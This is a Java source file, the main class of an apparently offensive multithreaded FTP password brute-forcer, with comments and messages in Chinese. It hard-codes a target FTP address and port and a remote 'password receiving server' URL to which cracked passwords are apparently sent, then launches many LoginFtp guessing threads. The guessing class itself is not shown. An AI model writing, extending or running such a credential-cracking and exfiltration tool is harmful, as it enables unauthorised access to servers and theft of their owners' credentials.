public class Main
{
	// 目标FTP的IP地址
	public static final String FTP_ADDRESS = "192.168.164.68";
	// 目标FTP的端口
	public static final int FTP_PORT = 21;
	// 密码接收服务器
	public static final String SUBMIT_ADDRESS = "http://json.comxa.com/ftp.php?pwd=";

	// java Main
	public static void main(String[] args)
	{
		if (args.length != 2)
		{
			System.out.println("没有指定密码位数或线程数量");
			printDoc();
			return;
		}
		else if (!isNumber(args[0]))
		{
			System.out.println("指定指定密码位数不是数字");
			printDoc();
			return;
		}
		else if (!isNumber(args[1]))
		{
			System.out.println("指定指定线程数量不是数字");
			printDoc();
			return;
		}
		else
		{
			int numPwd = Integer.parseInt(args[0]);
			int threadNum = Integer.parseInt(args[1]);
			System.out.println("密码位数:" + numPwd + ",线程数量:" + threadNum);
			System.out.println("5秒后开始");
			for (int i = 5; i >= 0; i--)
			{
				System.out.println(i);
				try
				{
					Thread.sleep(1000);
				}
				catch (InterruptedException e)
				{
				}
			}
			for (int i = 0; i < threadNum; i++)
				new LoginFtp(numPwd).start();
		}
	}

	static void printDoc()
	{
		System.out.println("使用:java Main 密码位数 线程数量");
	}

	static boolean isNumber(String numStr)
	{
		try
		{
			Integer.parseInt(numStr);
		}
		catch (Exception e)
		{
			return false;
		}
		return true;
	}
}
